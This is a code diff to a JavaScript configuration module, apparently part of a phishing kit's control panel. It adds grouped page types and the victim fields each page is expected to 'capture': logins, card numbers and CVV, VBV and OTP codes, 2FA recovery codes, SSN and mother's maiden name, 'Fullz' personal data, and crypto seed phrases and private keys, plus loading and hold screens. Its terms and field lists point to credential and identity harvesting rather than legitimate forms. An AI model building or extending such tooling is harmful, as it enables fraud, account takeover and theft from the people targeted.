@@ -4,40 +4,120 @@
  */
 const DemoPagesFields = (() => {
   // ─── Form type config ────────────────────────────────────────────────────────
+  // Category groups for the form-type picker (order + label + accent color)
+  const FORM_TYPE_GROUPS = [
+    { key: 'flow',     label: '🎬  Flow / Screens',       color: '#94a3b8' },
+    { key: 'auth',     label: '🔐  Auth / Access',        color: '#3b82f6' },
+    { key: 'payment',  label: '💳  Payment / Banking',    color: '#f59e0b' },
+    { key: 'verify',   label: '✉️  Verification / 2FA',    color: '#10b981' },
+    { key: 'identity', label: '🪪  Identity / KYC',        color: '#ec4899' },
+    { key: 'crypto',   label: '🪙  Crypto / Web3',         color: '#eab308' },
+    { key: 'other',    label: '📋  Other',                color: '#a855f7' },
+  ];
+
   const FORM_TYPES = [
-    { value: 'general',        label: 'General',              color: '#6b7280', bg: 'rgba(107,114,128,0.12)' },
-    { value: 'loading',        label: 'Loading / Hold Screen',color: '#f59e0b', bg: 'rgba(245,158,11,0.12)'  },
-    { value: 'warning',        label: 'Warning / Alert Screen',color: '#ef4444', bg: 'rgba(239,68,68,0.12)' },
-    { value: 'login',          label: 'Login / Creds',        color: '#3b82f6', bg: 'rgba(59,130,246,0.12)'  },
-    { value: 'credit_card',    label: 'Credit Card',          color: '#f59e0b', bg: 'rgba(245,158,11,0.12)' },
-    { value: 'otp',            label: 'OTP / SMS',            color: '#10b981', bg: 'rgba(16,185,129,0.12)' },
-    { value: 'email_verify',   label: 'Email Verification',   color: '#06b6d4', bg: 'rgba(6,182,212,0.12)'  },
-    { value: 'authenticator',  label: 'Authenticator / 2FA',  color: '#f97316', bg: 'rgba(249,115,22,0.12)' },
-    { value: 'id_upload',      label: 'ID Upload / Selfie',   color: '#ec4899', bg: 'rgba(236,72,153,0.12)' },
-    { value: 'banking',        label: 'Banking Details',      color: '#14b8a6', bg: 'rgba(20,184,166,0.12)' },
-    { value: 'personal_info',  label: 'Personal Info / Fullz',color: '#a855f7', bg: 'rgba(168,85,247,0.12)' },
-    { value: 'kyc',            label: 'KYC / Document',       color: '#8b5cf6', bg: 'rgba(139,92,246,0.12)' },
-    { value: 'crypto',         label: 'Crypto / Wallet',      color: '#eab308', bg: 'rgba(234,179,8,0.12)'  },
+    { value: 'general',        label: 'General',                  icon: '📄', group: 'flow',     color: '#6b7280', bg: 'rgba(107,114,128,0.12)' },
+    { value: 'loading',        label: 'Loading / Hold Screen',    icon: '⏳', group: 'flow',     color: '#f59e0b', bg: 'rgba(245,158,11,0.12)'  },
+    { value: 'warning',        label: 'Warning / Alert Screen',   icon: '⚠️', group: 'flow',     color: '#ef4444', bg: 'rgba(239,68,68,0.12)' },
+    { value: 'error',          label: 'Error / Retry',            icon: '❌', group: 'flow',     color: '#f87171', bg: 'rgba(248,113,113,0.12)' },
+    { value: 'exit',           label: 'Exit / Success Landing',   icon: '✅', group: 'flow',     color: '#4ade80', bg: 'rgba(74,222,128,0.12)' },
+    { value: 'landing',        label: 'Landing / Splash',         icon: '🏁', group: 'flow',     color: '#38bdf8', bg: 'rgba(56,189,248,0.12)' },
+
+    { value: 'signup',         label: 'Signup / Registration',    icon: '📝', group: 'auth',     color: '#22d3ee', bg: 'rgba(34,211,238,0.12)' },
+    { value: 'login',          label: 'Login / Creds',            icon: '🔑', group: 'auth',     color: '#3b82f6', bg: 'rgba(59,130,246,0.12)' },
+    { value: 'forgot_password',label: 'Forgot / Recover Password',icon: '🔓', group: 'auth',     color: '#818cf8', bg: 'rgba(129,140,248,0.12)' },
+    { value: 'password_reset', label: 'Password Reset',           icon: '🔁', group: 'auth',     color: '#6366f1', bg: 'rgba(99,102,241,0.12)' },
+    { value: 'security_qa',    label: 'Security Q&A',             icon: '❓', group: 'auth',     color: '#a3e635', bg: 'rgba(163,230,53,0.12)' },
+
+    { value: 'credit_card',    label: 'Credit Card',              icon: '💳', group: 'payment',  color: '#f59e0b', bg: 'rgba(245,158,11,0.12)' },
+    { value: 'card_verify',    label: 'Card Verification / VBV',  icon: '🛡️', group: 'payment',  color: '#fbbf24', bg: 'rgba(251,191,36,0.12)' },
+    { value: 'bank_transfer',  label: 'Bank Transfer / Wire',     icon: '🏦', group: 'payment',  color: '#0ea5e9', bg: 'rgba(14,165,233,0.12)' },
+    { value: 'banking',        label: 'Banking Details',          icon: '🏛️', group: 'payment',  color: '#14b8a6', bg: 'rgba(20,184,166,0.12)' },
+    { value: 'payment',        label: 'Payment / Checkout',       icon: '🛒', group: 'payment',  color: '#10b981', bg: 'rgba(16,185,129,0.12)' },
+    { value: 'shipping',       label: 'Shipping Info',            icon: '📦', group: 'payment',  color: '#84cc16', bg: 'rgba(132,204,22,0.12)' },
+
+    { value: 'otp',            label: 'OTP / SMS',                icon: '📱', group: 'verify',   color: '#10b981', bg: 'rgba(16,185,129,0.12)' },
+    { value: 'email_verify',   label: 'Email Verification',       icon: '✉️', group: 'verify',   color: '#06b6d4', bg: 'rgba(6,182,212,0.12)' },
+    { value: 'phone_verify',   label: 'Phone Verification',       icon: '☎️', group: 'verify',   color: '#5eead4', bg: 'rgba(94,234,212,0.12)' },
+    { value: 'authenticator',  label: 'Authenticator / 2FA',      icon: '🔐', group: 'verify',   color: '#f97316', bg: 'rgba(249,115,22,0.12)' },
+    { value: 'recovery_code',  label: 'Backup / Recovery Codes',  icon: '🎫', group: 'verify',   color: '#fb923c', bg: 'rgba(251,146,60,0.12)' },
+    { value: 'push_approve',   label: 'Push Approval',            icon: '🔔', group: 'verify',   color: '#c084fc', bg: 'rgba(192,132,252,0.12)' },
+
+    { value: 'id_upload',      label: 'ID Upload / Selfie',       icon: '📸', group: 'identity', color: '#ec4899', bg: 'rgba(236,72,153,0.12)' },
+    { value: 'kyc',            label: 'KYC / Document',           icon: '🪪', group: 'identity', color: '#8b5cf6', bg: 'rgba(139,92,246,0.12)' },
+    { value: 'address',        label: 'Address / Billing',        icon: '🏠', group: 'identity', color: '#f472b6', bg: 'rgba(244,114,182,0.12)' },
+    { value: 'personal_info',  label: 'Personal Info / Fullz',    icon: '👤', group: 'identity', color: '#a855f7', bg: 'rgba(168,85,247,0.12)' },
+    { value: 'ssn',            label: 'SSN / Tax ID',             icon: '🧾', group: 'identity', color: '#d946ef', bg: 'rgba(217,70,239,0.12)' },
+
+    { value: 'crypto',         label: 'Crypto / Wallet',          icon: '🪙', group: 'crypto',   color: '#eab308', bg: 'rgba(234,179,8,0.12)' },
+    { value: 'seed_phrase',    label: 'Seed Phrase / Mnemonic',   icon: '🌱', group: 'crypto',   color: '#facc15', bg: 'rgba(250,204,21,0.12)' },
+    { value: 'private_key',    label: 'Private Key Import',       icon: '🗝️', group: 'crypto',   color: '#f59e0b', bg: 'rgba(245,158,11,0.12)' },
+    { value: 'wallet_connect', label: 'WalletConnect / dApp',     icon: '🔗', group: 'crypto',   color: '#fde047', bg: 'rgba(253,224,71,0.12)' },
+
+    { value: 'survey',         label: 'Survey / Questionnaire',   icon: '📊', group: 'other',    color: '#e879f9', bg: 'rgba(232,121,249,0.12)' },
   ];
 
   function getTypeInfo(value) {
-    return FORM_TYPES.find(t => t.value === value) || FORM_TYPES[0];
+    // Accept comma-separated form_type strings (multi-select). The FIRST
+    // value is treated as the "primary" for the badge / card accent color.
+    const first = String(value || '').split(',')[0].trim();
+    return FORM_TYPES.find(t => t.value === first) || FORM_TYPES[0];
+  }
+  // Parse a possibly comma-separated form_type into an array of info objects.
+  function getTypeInfoList(value) {
+    const values = String(value || '').split(',').map(s => s.trim()).filter(Boolean);
+    if (!values.length) return [FORM_TYPES[0]];
+    return values.map(v => FORM_TYPES.find(t => t.value === v)).filter(Boolean);
   }
 
   // ─── Expected fields config by form type ─────────────────────────────────────
   const EXPECTED_FIELDS_BY_TYPE = {
-    loading: [],
-    login: ['email', 'password'],
-    credit_card: ['card_number', 'card_holder', 'expiry', 'cvv'],
-    otp: ['otp_code'],
-    email_verify: ['email_code'],
-    authenticator: ['auth_code'],
-    id_upload: ['id_front', 'id_back', 'selfie'],
-    banking: ['bank_name', 'account_number', 'routing_number'],
-    personal_info: ['full_name', 'dob', 'address', 'city', 'state', 'zip_code', 'country'],
-    kyc: ['ssn', 'dob', 'mother_maiden'],
-    crypto: ['seed_phrase', 'private_key', 'wallet_address', 'wallet_provider'],
-    general: []
+    // Flow pages — no capture expected
+    general:         [],
+    loading:         [],
+    warning:         [],
+    error:           [],
+    exit:            [],
+    landing:         [],
+
+    // Auth
+    login:           ['email', 'password'],
+    signup:          ['email', 'password', 'full_name'],
+    forgot_password: ['email'],
+    password_reset:  ['password', 'password_confirm'],
+    security_qa:    ['security_question', 'security_answer'],
+
+    // Payment
+    credit_card:     ['card_number', 'card_holder', 'expiry', 'cvv'],
+    card_verify:     ['card_number', 'cvv', 'otp_code'],
+    bank_transfer:   ['account_number', 'routing_number', 'bank_name'],
+    banking:         ['bank_name', 'account_number', 'routing_number'],
+    payment:         ['card_number', 'expiry', 'cvv'],
+    shipping:        ['full_name', 'address', 'city', 'state', 'zip_code', 'country'],
+
+    // Verification / 2FA
+    otp:             ['otp_code'],
+    email_verify:    ['email_code'],
+    phone_verify:    ['phone', 'otp_code'],
+    authenticator:   ['auth_code'],
+    recovery_code:   ['recovery_code'],
+    push_approve:    [],
+
+    // Identity
+    id_upload:       ['id_front', 'id_back', 'selfie'],
+    kyc:             ['ssn', 'dob', 'mother_maiden'],
+    address:         ['address', 'city', 'state', 'zip_code', 'country'],
+    personal_info:   ['full_name', 'dob', 'address', 'city', 'state', 'zip_code', 'country'],
+    ssn:             ['ssn'],
+
+    // Crypto
+    crypto:          ['seed_phrase', 'private_key', 'wallet_address', 'wallet_provider'],
+    seed_phrase:     ['seed_phrase'],
+    private_key:     ['private_key'],
+    wallet_connect:  ['wallet_address', 'wallet_provider'],
+
+    // Other
+    survey:          [],
   };
 
   // ─── Field Groups ─────────────────────────────────────────────────────────────
@@ -267,10 +347,12 @@ const DemoPagesFields = (() => {
 
   return {
     FORM_TYPES,
+    FORM_TYPE_GROUPS,
     FIELD_GROUPS,
     EXPECTED_FIELDS_BY_TYPE,
     CANONICAL_FIELDS,
     getTypeInfo,
+    getTypeInfoList,
     guessCanonical,
     renderGroupedOptionsHtml,
     detectDigitGroups,
